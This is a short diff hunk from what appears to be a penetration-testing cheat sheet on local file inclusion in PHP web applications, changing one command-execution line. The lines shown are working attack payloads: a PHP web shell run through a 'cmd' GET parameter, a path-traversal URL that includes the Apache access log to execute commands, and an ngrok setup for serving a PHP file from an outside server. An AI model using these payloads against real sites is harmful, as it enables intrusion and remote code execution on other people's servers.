@@ -27,7 +27,7 @@ To automate the process, use the following tools
 - execute a php file from an external server
 -     ./ngrok http 9000  && python -m SimpleHTTPServer
 - execute a command
--     <?php system("ls /"); ?>
+-     <?php system('ls') ?>
 - add cmd as a parameter
 -     <?php system($_GET['cmd']); ?>
 -     example.com/index.php?view=cat../../../../../../../../../var/log/apache2/access.log&cmd=ls
